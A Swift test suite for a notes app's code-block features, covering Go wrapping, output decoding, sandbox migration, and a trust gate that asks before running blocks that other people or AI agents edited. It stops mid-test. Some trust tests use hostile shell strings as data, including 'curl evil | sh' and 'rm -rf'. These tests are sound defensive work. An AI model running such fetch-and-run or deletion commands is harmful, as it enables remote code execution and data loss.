import Foundation
import Testing
@testable import TaisceKit

@Suite struct FenceInfoTests {
    @Test func languageAndAttributes() {
        let f = FenceInfo("bash cwd=~/code/portus")
        #expect(f.language == "bash")
        #expect(f.attributes == ["cwd": "~/code/portus"])
        #expect(f.cwd(home: "/Users/t") == "/Users/t/code/portus")
        #expect(FenceInfo("Go").normalizedLanguage == "go")
        #expect(FenceInfo(nil).language == nil)
        #expect(FenceInfo("").language == nil)
    }

    @Test func quotedValuesAndOddWords() {
        let f = FenceInfo(#"zsh  cwd="~/My Code"  title='a b' flag =x CWD=/tmp"#)
        #expect(f.language == "zsh")
        // later keys win; keys are case-insensitive; `=x` (no key) is ignored
        #expect(f.attributes["cwd"] == "/tmp")
        #expect(f.attributes["title"] == "a b")
        #expect(f.attributes.count == 2)
        #expect(FenceInfo.expandTilde("~", home: "/h") == "/h")
        #expect(FenceInfo.expandTilde("~other/x", home: "/h") == "~other/x")
        #expect(FenceInfo("bash cwd=").cwd(home: "/h") == nil)
    }

    @Test func rendererSplitsTheInfoString() {
        let b = Block(id: "b", docID: "d", parentID: nil, orderKey: "i", blockType: .code, content: "```bash cwd=~/code/portus\nls\n```")
        #expect(BlockRenderer.render(b) == [.code(language: "bash", code: "ls", attributes: ["cwd": "~/code/portus"])])
        // a diagram fence with attributes is still a diagram
        let m = Block(id: "m", docID: "d", parentID: nil, orderKey: "i", blockType: .paragraph, content: "```mermaid theme=dark\ngraph TD\n```")
        #expect(BlockRenderer.render(m) == [.diagram(kind: "mermaid", source: "graph TD")])
    }

    @Test func runnableLanguages() {
        #expect(RunnableLanguage("bash") == .shell(interpreter: "/bin/bash"))
        #expect(RunnableLanguage("SH") == .shell(interpreter: "/bin/sh"))
        #expect(RunnableLanguage("zsh") == .shell(interpreter: "/bin/zsh"))
        #expect(RunnableLanguage("go") == .go)
        #expect(RunnableLanguage("python") == nil)
        #expect(RunnableLanguage(nil) == nil)
    }
}

@Suite struct FenceEditTests {
    @Test func replacesTheFenceBody() {
        let content = "```go\nfmt.Println(1)\n```"
        #expect(FenceEdit.replacingCode(in: content, with: "fmt.Println(2)\nfmt.Println(3)") == "```go\nfmt.Println(2)\nfmt.Println(3)\n```")
        // the info string and a tilde fence survive; a body holding ``` gets a longer fence
        #expect(FenceEdit.replacingCode(in: "~~~bash cwd=~/x\nls\n~~~", with: "pwd") == "~~~bash cwd=~/x\npwd\n~~~")
        #expect(FenceEdit.replacingCode(in: "```sh\necho\n```", with: "cat <<EOF\n```\nEOF") == "````sh\ncat <<EOF\n```\nEOF\n````")
        #expect(FenceEdit.replacingCode(in: "no fence here", with: "x") == nil)
    }
}

@Suite struct GoProgramTests {
    static let pairSum = """
    func pairSum(nums []int, target int) (int, int, bool) {
    \tl, r := 0, len(nums)-1
    \tfor l < r {
    \t\ts := nums[l] + nums[r]
    \t\tswitch {
    \t\tcase s == target:
    \t\t\treturn l, r, true
    \t\tcase s < target:
    \t\t\tl++
    \t\tdefault:
    \t\t\tr--
    \t\t}
    \t}
    \treturn -1, -1, false
    }
    """

    @Test func classifiesEachShape() {
        #expect(GoProgram.classify("package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Println(1)\n}") == .program)
        #expect(GoProgram.classify("func main() { println(1) }") == .program)
        #expect(GoProgram.classify(Self.pairSum) == .declarations)
        #expect(GoProgram.classify("type P struct{ X int }\n\nvar origin = P{}\nconst n = 3") == .declarations)
        #expect(GoProgram.classify("x := 3\nfmt.Println(x * 2)") == .statements)
        #expect(GoProgram.classify("var total int\nfor i := 0; i < 3; i++ {\n\ttotal += i\n}\nfmt.Println(total)") == .statements)
        // a func literal call is a statement, a method a declaration
        #expect(GoProgram.classify("func() {\n\tprintln(1)\n}()") == .statements)
        #expect(GoProgram.classify("func (p P) Len() int { return 0 }") == .declarations)
        // comments and strings never decide anything
        #expect(GoProgram.classify("// func main() {}\ns := \"func main() {}\"\nprintln(s)") == .statements)
    }

    @Test func programRunsAsWritten() {
        let src = "package main\n\nfunc main() {\n\tfmt.Println(strings.ToUpper(\"a\"))\n}"
        let p = GoProgram.prepare(src)
        #expect(p.shape == .program)
        #expect(p.inferredImports == ["fmt", "strings"])
        #expect(p.source == "package main\n\nimport (\n\t\"fmt\"\n\t\"strings\"\n)\n\nfunc main() {\n\tfmt.Println(strings.ToUpper(\"a\"))\n}")
        // nothing to add: byte for byte
        let full = "package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(1) }\n"
        #expect(GoProgram.prepare(full).source == full)
        #expect(GoProgram.prepare("func main() {}").source == "package main\n\nfunc main() {}")
    }

    @Test func declarationsGetAMainFromTheTryLine() {
        let p = GoProgram.prepare(Self.pairSum, tryLine: "pairSum([]int{1,2,4,7}, 6)")
        #expect(p.shape == .declarations)
        #expect(p.inferredImports == ["fmt"])
        #expect(p.source.hasPrefix("package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc pairSum("))
        #expect(p.source.hasSuffix("\nfunc main() {\n\tfmt.Println(pairSum([]int{1,2,4,7}, 6))\n}\n"))
        // an empty try line: an empty main, so the block at least compiles
        let empty = GoProgram.prepare(Self.pairSum, tryLine: "  ")
        #expect(empty.inferredImports.isEmpty)
        #expect(empty.source.hasSuffix("\nfunc main() {}\n"))
    }

    @Test func statementsAreWrappedAndDeclarationsHoisted() {
        let src = "// sum a few\nnums := []int{3, 1, 2}\nsort.Ints(nums)\n\nfunc double(x int) int { return x * 2 }\n\nfmt.Println(double(nums[0]))"
        let p = GoProgram.prepare(src)
        #expect(p.shape == .statements)
        #expect(p.inferredImports == ["fmt", "sort"])
        #expect(p.source == """
        package main

        import (
        \t"fmt"
        \t"sort"
        )

        func double(x int) int { return x * 2 }

        func main() {
        \t// sum a few
        \tnums := []int{3, 1, 2}
        \tsort.Ints(nums)
        \tfmt.Println(double(nums[0]))
        }

        """)
    }

    @Test func importsFromTheTable() {
        let src = "h := &IntHeap{2, 1}\nheap.Init(h)\nb := strings.Builder{}\nb.WriteString(strconv.Itoa(utf8.RuneLen('é')))\n_ = math.Sqrt(2)\n_ = errors.New(\"x\")\n_ = time.Now()\n_ = os.Args\n_ = unicode.IsUpper('A')\n_ = bytes.Buffer{}\n_ = slices.Max([]int{1})\n_ = maps.Keys(map[int]int{})\nvar mu sync.Mutex\n_ = &mu"
        let p = GoProgram.prepare(src)
        #expect(Set(p.inferredImports) == ["container/heap", "strings", "strconv", "unicode/utf8", "math", "errors", "time", "os", "unicode", "bytes", "slices", "maps", "sync"])
        #expect(p.inferredImports == p.inferredImports.sorted())
    }

    @Test func shadowedNamesAndWrittenImportsAreNotImported() {
        // a variable named like a package; a field chain; a written import; a string
        let src = """
        import m "math"
        list := []int{1}
        url := struct{ Host string }{"h"}
        fmt.Println(list, url.Host, m.Pi, a.b.strings, "sort.Ints")
        """
        let p = GoProgram.prepare(src)
        #expect(p.inferredImports == ["fmt"])
        #expect(p.source.contains("\tm \"math\"\n"))
        // parameters and range variables shadow too
        let q = GoProgram.prepare("func f(path string, time int) string { return path }\nfor _, bytes := range []string{} { _ = bytes }")
        #expect(q.inferredImports.isEmpty)
    }

    @Test func unusedImportsFromTheCompiler() {
        let out = """
        # run
        ./main.go:4:2: "os" imported and not used
        ./main.go:5:2: "math/rand" imported as r and not used
        ./main.go:9:2: declared and not used: x
        """
        #expect(GoProgram.unusedImports(fromBuildOutput: out) == ["os", "math/rand"])
        let src = "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\tr \"math/rand\"\n)\n\nimport \"os\"\n"
        #expect(GoProgram.removingImports(["os", "math/rand"], from: src) == "package main\n\nimport (\n\t\"fmt\"\n)\n\n")
    }

    @Test func firstFunctionForTheTryLineHint() {
        #expect(GoProgram.firstFunction(in: Self.pairSum) == "pairSum")
        #expect(GoProgram.firstFunction(in: "// helper\ntype T int\nfunc (t T) M() {}\nfunc main() {}\nfunc g[K any](k K) {}") == "g")
        #expect(GoProgram.firstFunction(in: "x := 1") == nil)
    }

    @Test func goModFromTheToolchainVersion() {
        #expect(GoProgram.goMod(goVersion: "go1.26.1\n") == "module run\n\ngo 1.26.1\n")
        #expect(GoProgram.goMod(goVersion: "devel go1.27-abc") == "module run\n\ngo 1.22\n")
    }
}

@Suite struct LoginEnvironmentTests {
    @Test func parsesEnvZero() {
        var data = Data("Last login: today\nwelcome!\nPATH=/opt/homebrew/bin:/usr/bin".utf8)
        data.append(0)
        data.append(contentsOf: Array("MULTI=line one\nline two".utf8))
        data.append(0)
        data.append(contentsOf: Array("EMPTY=".utf8))
        data.append(0)
        data.append(contentsOf: Array("SHLVL=2".utf8))
        data.append(0)
        data.append(contentsOf: Array("_=/usr/bin/env".utf8))
        data.append(0)
        data.append(contentsOf: Array("not a record".utf8))
        data.append(0)
        data.append(contentsOf: Array("EQ=a=b".utf8))
        data.append(0)
        let env = LoginEnvironment.parse(data)
        #expect(env == ["PATH": "/opt/homebrew/bin:/usr/bin", "MULTI": "line one\nline two", "EMPTY": "", "EQ": "a=b"])
    }

    @Test func whichSearchesThePath() {
        let present: Set<String> = ["/opt/homebrew/bin/go"]
        #expect(LoginEnvironment.which("go", path: "/usr/bin::/opt/homebrew/bin", isExecutable: { present.contains($0) }) == "/opt/homebrew/bin/go")
        #expect(LoginEnvironment.which("go", path: "/usr/bin", isExecutable: { present.contains($0) }) == nil)
        #expect(LoginEnvironment.which("go", path: nil) == nil)
    }

    @Test func seedIsMinimal() {
        let s = LoginEnvironment.seed(home: "/Users/t", user: "t", shell: "/bin/zsh", tmpdir: nil)
        #expect(s["PATH"] == "/usr/bin:/bin:/usr/sbin:/sbin")
        #expect(Set(s.keys) == ["HOME", "USER", "LOGNAME", "SHELL", "PATH", "LANG"])
    }
}

@Suite struct RunOutputTests {
    @Test func stripsAnsi() {
        #expect(TerminalTextDecoder.strip("\u{1B}[1;31mred\u{1B}[0m plain") == "red plain")
        #expect(TerminalTextDecoder.strip("\u{1B}]0;title\u{07}after") == "after")
        #expect(TerminalTextDecoder.strip("\u{1B}]8;;http://x\u{1B}\\link\u{1B}]8;;\u{1B}\\") == "link")
        #expect(TerminalTextDecoder.strip("a\u{1B}(Bb\u{1B}7c\u{1B}[?25ld") == "abcd")
    }

    @Test func carriesSplitSequencesAndCharacters() {
        var d = TerminalTextDecoder()
        let bytes = Array("x\u{1B}[31mé€😀y".utf8)
        var out = ""
        for b in bytes { out += d.decode([b]) }
        out += d.decode([], final: true)
        #expect(out == "xé€😀y")
    }

    @Test func collectorCapsAndMerges() {
        var c = OutputCollector(cap: 10)
        c.add(Array("hello ".utf8), from: .stdout)
        c.add(Array("there".utf8), from: .stdout)
        c.add(Array("err".utf8), from: .stderr)
        #expect(c.truncated)
        #expect(c.bytes == 10)
        #expect(c.drain() == [OutputChunk(.stdout, "hello ther")])
        #expect(c.drain().isEmpty)
        c.add(Array("more".utf8), from: .stdout)
        #expect(c.drain().isEmpty)
    }

    @Test func interleavesStreamsInArrivalOrder() {
        var c = OutputCollector()
        c.add(Array("a".utf8), from: .stdout)
        c.add(Array("b".utf8), from: .stderr)
        c.add(Array("c".utf8), from: .stdout)
        c.add(Array("d".utf8), from: .stdout)
        #expect(c.drain() == [OutputChunk(.stdout, "a"), OutputChunk(.stderr, "b"), OutputChunk(.stdout, "cd")])
        var log = OutputLog([OutputChunk(.stdout, "1")])
        log.append([OutputChunk(.stdout, "2"), OutputChunk(.stderr, "")])
        #expect(log.chunks == [OutputChunk(.stdout, "12")])
    }

    @Test func tailCutsAtALine() {
        let log = OutputLog([OutputChunk(.stdout, "one\ntwo\n"), OutputChunk(.stderr, "three\n")])
        let t = log.tail(9)
        #expect(t.dropped)
        #expect(t.chunks == [OutputChunk(.stderr, "three\n")])
        #expect(log.tail(12).chunks == [OutputChunk(.stdout, "two\n"), OutputChunk(.stderr, "three\n")])
        #expect(log.tail(100).dropped == false)
    }
}

@Suite struct RunTrustTests {
    let me = RunTrust.Me(principalID: "p-tom", name: "Tom")

    func op(_ by: String, _ name: String, epoch: Int, block: String?, type: String = "replace", applied: Bool = true) -> DocHistoryEntry {
        DocHistoryEntry(opID: "op-\(epoch)", principalName: name, principalKind: by == "p-tom" ? "human" : "agent", applied: applied,
                        principalID: by, epoch: epoch, targetBlock: block, opType: type)
    }

    @Test func yourOwnBlockRuns() {
        let h = [op("p-claude", "claude:x", epoch: 5, block: "other"), op("p-tom", "Tom", epoch: 4, block: "b1", type: "insert")]
        #expect(RunTrust.decide(block: "b1", history: h, me: me, practiceEditedByMe: false, approval: nil, docEpoch: 5) == .run)
    }

    @Test func someoneElsesBlockAsks() {
        let h = [op("p-claude", "claude:tagger", epoch: 6, block: "b1"), op("p-tom", "Tom", epoch: 4, block: "b1", type: "insert")]
        #expect(RunTrust.decide(block: "b1", history: h, me: me, practiceEditedByMe: false, approval: nil, docEpoch: 6) == .ask(lastEditedBy: "claude:tagger"))
        // a move by someone else doesn't change the code
        let moved = [op("p-aoife", "Aoife", epoch: 7, block: "b1", type: "move")] + h.dropFirst()
        #expect(RunTrust.decide(block: "b1", history: Array(moved), me: me, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .run)
    }

    @Test func practiceEditsAreYours() {
        let h = [op("p-claude", "claude:x", epoch: 6, block: "b1")]
        #expect(RunTrust.decide(block: "b1", history: h, me: me, practiceEditedByMe: true, approval: nil, docEpoch: 6) == .run)
    }

    @Test func unknownAsks() {
        #expect(RunTrust.decide(block: "b1", history: [], me: me, practiceEditedByMe: false, approval: nil, docEpoch: 1) == .ask(lastEditedBy: "someone else"))
        #expect(RunTrust.decide(block: "b1", history: nil, me: me, practiceEditedByMe: false, approval: nil, docEpoch: 1) == .ask(lastEditedBy: "someone (couldn't check: offline)"))
    }

    @Test func approvalHoldsUntilSomeoneElseChangesTheDoc() {
        let h = [op("p-claude", "claude:x", epoch: 6, block: "b1")]
        let a = RunTrust.approval(history: h, me: me, docEpoch: 6)
        #expect(a == RunTrust.Approval(docEpoch: 6, othersEpoch: 6))
        #expect(RunTrust.decide(block: "b1", history: h, me: me, practiceEditedByMe: false, approval: a, docEpoch: 6) == .run)
        // your own later edit elsewhere in the doc: still approved
        let mine = [op("p-tom", "Tom", epoch: 7, block: "b2")] + h
        #expect(RunTrust.decide(block: "b1", history: mine, me: me, practiceEditedByMe: false, approval: a, docEpoch: 7) == .run)
        // someone else changes anything in the doc: ask again
        let theirs = [op("p-aoife", "Aoife", epoch: 8, block: "b3")] + mine
        #expect(RunTrust.decide(block: "b1", history: theirs, me: me, practiceEditedByMe: false, approval: a, docEpoch: 8) == .ask(lastEditedBy: "claude:x"))
        // offline: holds only while the doc hasn't moved at all
        #expect(RunTrust.decide(block: "b1", history: nil, me: me, practiceEditedByMe: false, approval: a, docEpoch: 6) == .run)
        #expect(RunTrust.decide(block: "b1", history: nil, me: me, practiceEditedByMe: false, approval: a, docEpoch: 7) == .ask(lastEditedBy: "someone (couldn't check: offline)"))
    }

    @Test func approvalWithNoOtherAuthorYet() {
        // asked because the block was unknown; nobody else in the history
        let h = [op("p-tom", "Tom", epoch: 3, block: "b2")]
        let a = RunTrust.approval(history: h, me: me, docEpoch: 3)
        #expect(a.othersEpoch == nil)
        #expect(RunTrust.decide(block: "b1", history: h, me: me, practiceEditedByMe: false, approval: a, docEpoch: 3) == .run)
        let later = [op("p-claude", "claude:x", epoch: 4, block: "b9")] + h
        #expect(RunTrust.decide(block: "b1", history: later, me: me, practiceEditedByMe: false, approval: a, docEpoch: 4) == .ask(lastEditedBy: "someone else"))
    }

    /// S2: ops that carry your principal but someone else's content.
    @Test func declineRevertsAreUnknown() {
        let decline = DocHistoryEntry(opID: "o9", principalName: "Tom", principalKind: "human", principalID: "p-tom", epoch: 9, targetBlock: "b1", opType: "replace", sourceRefs: ["review:decline:ann-1"], content: "echo old")
        let h = [decline, op("p-claude", "claude:x", epoch: 8, block: "b1"), op("p-tom", "Tom", epoch: 2, block: "b1", type: "insert")]
        #expect(RunTrust.author(of: "b1", history: h, me: me) == .unknown)
        #expect(RunTrust.decide(block: "b1", history: h, me: me, practiceEditedByMe: false, approval: nil, docEpoch: 9) == .ask(lastEditedBy: "someone else"))
    }

    @Test func linkRewritesLookFurtherBack() {
        let rewrite = DocHistoryEntry(opID: "o7", principalName: "Tom", principalKind: "human", principalID: "p-tom", epoch: 7, targetBlock: "b1", opType: "replace", sourceRefs: ["rename:Old → New"], content: "see [[New]]")
        func before(_ who: String, _ name: String) -> DocHistoryEntry {
            DocHistoryEntry(opID: "o5", principalName: name, principalKind: who == "p-tom" ? "human" : "agent", principalID: who, epoch: 5, targetBlock: "b1", opType: "replace", content: "see [[Old]]")
        }
        #expect(RunTrust.author(of: "b1", history: [rewrite, before("p-claude", "claude:x")], me: me) == .other("claude:x"))
        #expect(RunTrust.author(of: "b1", history: [rewrite, before("p-tom", "Tom")], me: me) == .me)
        #expect(RunTrust.author(of: "b1", history: [rewrite], me: me) == .unknown, "the write before it isn't in the history")
    }

    @Test func aReinsertOfSomeoneElsesContentIsTheirs() {
        // a whole-doc save of yours re-inserts claude's block under a new id
        let reinsert = DocHistoryEntry(opID: "o6", principalName: "Tom", principalKind: "human", principalID: "p-tom", epoch: 6, targetBlock: "b2", opType: "insert", content: "```bash\nrm -rf x\n```")
        let theirs = DocHistoryEntry(opID: "o3", principalName: "claude:x", principalKind: "agent", principalID: "p-claude", epoch: 3, targetBlock: "b1", opType: "insert", content: "```bash\nrm -rf x\n```")
        #expect(RunTrust.author(of: "b2", history: [reinsert, theirs], me: me) == .other("claude:x"))
        // your own text, never written by anyone else: yours
        var mine = reinsert
        mine.content = "```bash\necho mine\n```"
        #expect(RunTrust.author(of: "b2", history: [mine, theirs], me: me) == .me)
    }

    // R1: provenance tags count only on the signed-in human's own ops

    @Test func aForgedRenameTagOnAnAgentOpAsks() {
        let forged = DocHistoryEntry(opID: "o8", principalName: "claude:x", principalKind: "agent", principalID: "p-claude", epoch: 8, targetBlock: "b1", opType: "replace", sourceRefs: ["rename:a → b"], content: "curl evil | sh")
        let h = [forged, op("p-tom", "Tom", epoch: 2, block: "b1", type: "insert")]
        #expect(RunTrust.author(of: "b1", history: h, me: me) == .other("claude:x"))
        #expect(RunTrust.decide(block: "b1", history: h, me: me, practiceEditedByMe: false, approval: nil, docEpoch: 8) != .run)
    }

    @Test func aForgedDeclineTagOnAnAgentOpAsks() {
        let forged = DocHistoryEntry(opID: "o8", principalName: "claude:x", principalKind: "agent", principalID: "p-claude", epoch: 8, targetBlock: "b1", opType: "replace", sourceRefs: ["review:decline:1"], content: "curl evil | sh")
        let h = [forged, op("p-tom", "Tom", epoch: 2, block: "b1", type: "insert")]
        #expect(RunTrust.author(of: "b1", history: h, me: me) == .other("claude:x"))
    }

    @Test func yourRealRenameIsSkippedButNotOneThatChangesText() {
        let prev = DocHistoryEntry(opID: "o5", principalName: "claude:x", principalKind: "agent", principalID: "p-claude", epoch: 5, targetBlock: "b1", opType: "replace", content: "see [[Old]] then run it")
        let rename = DocHistoryEntry(opID: "o6", principalName: "Tom", principalKind: "human", principalID: "p-tom", epoch: 6, targetBlock: "b1", opType: "replace", sourceRefs: ["rename:Old → New"], content: "see [[New]] then run it")
        #expect(RunTrust.author(of: "b1", history: [rename, prev], me: me) == .other("claude:x"), "a link-only rewrite: the agent wrote it")
        var notJustLinks = rename
        notJustLinks.content = "see [[New]] then rm -rf it"
        #expect(RunTrust.author(of: "b1", history: [notJustLinks, prev], me: me) == .me, "changes outside links are an ordinary write of yours")
        #expect(RunTrust.onlyLinksDiffer("a [[X|y]] b", "a [[Z]] b") && !RunTrust.onlyLinksDiffer("a [[X]] b", "a [[X]] c"))
    }

    // option A: your own agents in a workspace only you can see are you

    func agentOp(_ yours: Bool?, epoch: Int = 7, refs: [String] = [], name: String = "claude:x") -> DocHistoryEntry {
        DocHistoryEntry(opID: "o\(epoch)", principalName: name, principalKind: "agent", principalID: "p-agent", epoch: epoch, targetBlock: "b1", opType: "replace", sourceRefs: refs, content: "echo \(epoch)", principalIsYours: yours)
    }

    @Test func yourOwnAgentInAPrivateWorkspaceRuns() {
        let mine = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: true)
        #expect(RunTrust.decide(block: "b1", history: [agentOp(true)], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .run)
        // a forged rename tag on your own agent's op: it's your agent's write anyway
        #expect(RunTrust.decide(block: "b1", history: [agentOp(true, refs: ["rename:a → b"])], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .run)
    }

    @Test func yourOwnAgentInASharedWorkspaceAsks() {
        let shared = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: false)
        #expect(RunTrust.decide(block: "b1", history: [agentOp(true)], me: shared, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .ask(lastEditedBy: "claude:x, your agent, in a shared workspace"))
    }

    @Test func anotherPersonsAgentAsksEvenInAPrivateWorkspace() {
        let mine = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: true)
        let aoifes = agentOp(false, name: "claude:x (Aoife)")
        #expect(RunTrust.decide(block: "b1", history: [aoifes], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .ask(lastEditedBy: "claude:x, Aoife's agent"))
        #expect(RunTrust.decide(block: "b1", history: [agentOp(false, refs: ["rename:a → b"], name: "claude:x (Aoife)"), op("p-tom", "Tom", epoch: 2, block: "b1", type: "insert")], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) != .run, "a forged rename on another person's agent asks")
    }

    @Test func unknownOwnershipOrSharingAsks() {
        let mine = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: true)
        // an older server: no principal_is_yours
        #expect(RunTrust.decide(block: "b1", history: [agentOp(nil)], me: mine, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .ask(lastEditedBy: "claude:x"))
        // sharing unknown
        let unsure = RunTrust.Me(principalID: "p-tom", name: "Tom", privateWorkspace: nil)
        #expect(RunTrust.decide(block: "b1", history: [agentOp(true)], me: unsure, practiceEditedByMe: false, approval: nil, docEpoch: 7) == .ask(lastEditedBy: "claude:x, your agent (couldn't tell whether this workspace is shared)"))
    }

    @Test func nameFallbackForOlderServers() {
        let old = RunTrust.Me(principalID: nil, name: "Tom")
        let h = [DocHistoryEntry(opID: "o", principalName: "Tom", principalKind: "human", epoch: 2, targetBlock: "b1", opType: "replace")]
        #expect(RunTrust.decide(block: "b1", history: h, me: old, practiceEditedByMe: false, approval: nil, docEpoch: 2) == .run)
        let nobody = RunTrust.Me(principalID: nil, name: nil)
        #expect(RunTrust.decide(block: "b1", history: h, me: nobody, practiceEditedByMe: false, approval: nil, docEpoch: 2) == .ask(lastEditedBy: "Tom"))
    }

    @Test func approvalsPersistPerServer() throws {
        let suite = "taisce.tests.approvals.\(UUID().uuidString)"
        let d = try #require(UserDefaults(suiteName: suite))
        defer { d.removePersistentDomain(forName: suite) }
        let a = RunApprovals(defaults: d, server: "https://taisce.test")
        a.approve("doc1", .init(docEpoch: 3, othersEpoch: 2))
        #expect(RunApprovals(defaults: d, server: "https://taisce.test").approval(for: "doc1") == .init(docEpoch: 3, othersEpoch: 2))
        #expect(RunApprovals(defaults: d, server: "https://other.test").approval(for: "doc1") == nil)
        a.forget()
        #expect(a.approval(for: "doc1") == nil)
    }

    @Test func historyDecodesProvenance() throws {
        let json = """
        [{"op":{"id":"0199a0b0-c0d0-7abc-8def-0123456789ab","doc_id":"d1","principal":"0199A0B0-0000-7000-8000-000000000001","epoch_applied":4,
                "kind":{"op":"replace","target":"0199A0B0-0000-7000-8000-0000000000BB","content":"x"}},"principal_name":"claude","principal_kind":"agent"},
         {"op":{"id":"o2","doc_id":"d1","principal":"p2","epoch_applied":3,"kind":{"op":"insert","block_id":"b2","parent_id":null,"order_key":"a","block_type":"code","content":"y"}},"principal_name":"tom","principal_kind":"human"},
         {"op":{"id":"o3","doc_id":"d1","epoch_applied":2,"kind":{"op":"rename_doc","title":"T"}},"principal_name":"tom","principal_kind":"human"},
         {"op":{"id":"o4","doc_id":"d1","epoch_applied":null},"principal_name":"tom","principal_kind":"human"},
         {"op":{"id":"o5","doc_id":"d1","epoch_applied":5,"source_refs":["review:decline:x"],"kind":{"op":"replace","target":"b1","content":"old"}},"principal_name":"tom","principal_kind":"human"}]
        """
        let rows = try JSONDecoder().decode([DocHistoryEntry].self, from: Data(json.utf8))
        #expect(rows[0].principalID == "0199a0b0-0000-7000-8000-000000000001")
        #expect(rows[0].targetBlock == "0199a0b0-0000-7000-8000-0000000000bb")
        #expect(rows[0].opType == "replace" && rows[0].epoch == 4)
        #expect(rows[1].targetBlock == "b2" && rows[1].opType == "insert")
        #expect(rows[2].targetBlock == nil && rows[2].opType == "rename_doc")
        #expect(rows[3].applied == false && rows[3].principalID == nil && rows[3].opType == nil)
        #expect(rows[3].sourceRefs.isEmpty && rows[0].content == "x" && rows[1].content == "y")
        #expect(rows[4].sourceRefs == ["review:decline:x"] && rows[4].content == "old")
        #expect(rows[0].principalIsYours == nil, "an older server: unknown")
        let newer = try JSONDecoder().decode([DocHistoryEntry].self, from: Data(#"[{"op":{"id":"o","doc_id":"d","epoch_applied":1},"principal_name":"claude:x","principal_kind":"agent","principal_is_yours":true}]"#.utf8))
        #expect(newer[0].principalIsYours == true)
    }
}

@Suite struct SandboxMigrationTests {
    func tempDir(_ name: String) throws -> URL {
        let d = FileManager.default.temporaryDirectory.appendingPathComponent("taisce-mig-\(name)-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: d, withIntermediateDirectories: true)
        return d
    }

    /// A fake container: a cache with a doc and two unsent writes (still in
    /// the WAL), and a preferences plist.
    func fakeContainer(prefs: [String: Any]) async throws -> URL {
        let data = try tempDir("container").appendingPathComponent("Data", isDirectory: true)
        let support = data.appendingPathComponent("Library/Application Support", isDirectory: true)
        try FileManager.default.createDirectory(at: support, withIntermediateDirectories: true)
        try await {
            let cache = try Cache(path: support.appendingPathComponent("cache-taisce.null.ie-0.sqlite").path)
            try await cache.storeDoc(DocTree(doc: DocSummary(id: "d1", parentID: nil, title: "Notes", currentEpoch: 3),
                                             roots: [BlockNode(block: Block(id: "b1", docID: "d1", parentID: nil, orderKey: "a", blockType: .paragraph, content: "hi"))]))
            _ = try await cache.enqueueTodoAdd(date: "2026-10-02", text: "buy milk")
            _ = try await cache.enqueueTodoAdd(date: "2026-10-02", text: "call Ann")
        }()
        try Data("other".utf8).write(to: support.appendingPathComponent("unrelated.txt"))
        let prefsDir = data.appendingPathComponent("Library/Preferences", isDirectory: true)
        try FileManager.default.createDirectory(at: prefsDir, withIntermediateDirectories: true)
        let plist = try PropertyListSerialization.data(fromPropertyList: prefs, format: .binary, options: 0)
        try plist.write(to: prefsDir.appendingPathComponent("ie.null.taisce.plist"))
        return data
    }

    @Test func migratesCacheWithOutboxAndPreferences() async throws {
        let container = try await fakeContainer(prefs: [
            "serverURL": "https://taisce.null.ie", "pins-taisce.null.ie-0": ["d1"], "doc.textSize": 2, "workspace-taisce.null.ie-0": "w1",
        ])
        let dest = try tempDir("support").appendingPathComponent("ie.null.taisce", isDirectory: true)
        let suite = "taisce.tests.migration.\(UUID().uuidString)"
        let defaults = try #require(UserDefaults(suiteName: suite))
        defer { defaults.removePersistentDomain(forName: suite) }
        // a key the new location already has keeps its value
        defaults.set(3, forKey: "doc.textSize")

        let r = SandboxMigration.run(containerData: container, supportDestination: dest, bundleID: "ie.null.taisce", defaults: defaults, domain: suite)
        #expect(r.complete)
        #expect(r.copied.contains("Application Support/cache-taisce.null.ie-0.sqlite"))
        #expect(!r.copied.contains { $0.contains("unrelated") })
        #expect(r.importedKeys == ["pins-taisce.null.ie-0", "serverURL", "workspace-taisce.null.ie-0"])
        #expect(r.keptKeys == ["doc.textSize"])
        #expect(defaults.string(forKey: "serverURL") == "https://taisce.null.ie")
        #expect(defaults.stringArray(forKey: "pins-taisce.null.ie-0") == ["d1"])
        #expect(defaults.integer(forKey: "doc.textSize") == 3)
        #expect(defaults.string(forKey: SandboxMigration.doneKey) != nil)

        // the app's Cache, opened on the result, has the doc and the unsent writes
        let cache = try Cache(path: dest.appendingPathComponent("cache-taisce.null.ie-0.sqlite").path)
        #expect(try await cache.pendingOutbox().count == 2)
        #expect(try await cache.doc("d1")?.title == "Notes")
        #expect(try await cache.blocks(of: "d1").map(\.content) == ["hi"])

        // the container is untouched
        #expect(FileManager.default.fileExists(atPath: container.appendingPathComponent("Library/Application Support/cache-taisce.null.ie-0.sqlite").path))
        #expect(FileManager.default.fileExists(atPath: container.appendingPathComponent("Library/Preferences/ie.null.taisce.plist").path))

        // idempotent: a second launch does nothing
        let again = SandboxMigration.run(containerData: container, supportDestination: dest, bundleID: "ie.null.taisce", defaults: defaults, domain: suite)
        #expect(again.alreadyDone && again.copied.isEmpty)
        #expect(SandboxMigration.logLines(again).isEmpty)
        #expect(SandboxMigration.logLines(r).first?.contains("sandbox container migration") == true)
    }

    func suite() throws -> (UserDefaults, String) {
        let name = "taisce.tests.migration.\(UUID().uuidString)"
        return (try #require(UserDefaults(suiteName: name)), name)
    }

    func run(_ container: URL, _ dest: URL, _ d: UserDefaults, _ name: String, fm: FileManager = .default) -> SandboxMigration.Report {
        SandboxMigration.run(containerData: container, supportDestination: dest, bundleID: "ie.null.taisce", defaults: d, domain: name, fileManager: fm)
    }

    static let cacheName = "cache-taisce.null.ie-0.sqlite"

    /// B1: a launch that can't read the container, then the app opens an
    /// (empty) cache at the destination, then a launch that can: the
    /// container's cache and outbox still come over.
    @Test func anEmptyCacheMadeBeforeMigratingIsReplaced() async throws {
        let container = try await fakeContainer(prefs: ["serverURL": "https://taisce.null.ie"])
        let dest = try tempDir("b1")
